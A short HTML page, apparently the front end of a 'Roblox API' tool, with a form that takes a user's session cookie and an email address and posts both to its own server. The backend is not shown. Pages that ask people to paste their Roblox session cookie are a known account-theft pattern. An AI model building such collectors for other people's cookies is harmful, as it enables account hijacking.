<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox API Request</title>
</head>
<body>
    <h1>Send Request to Roblox API</h1>
    <form id="requestForm">
        <label for="cookie">Cookie:</label><br>
        <input type="text" id="cookie" name="cookie" required><br><br>
        
        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email" required><br><br>
        
        <input type="submit" value="Send Request">
    </form>
    
    <h2>Response:</h2>
    <pre id="response"></pre>

    <script>
        document.getElementById('requestForm').onsubmit = async function(event) {
            event.preventDefault();
            const formData = new FormData(this);
            const response = await fetch('/send_request', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            document.getElementById('response').textContent = JSON.stringify(result, null, 2);
        };
    </script>
</body>
</html>
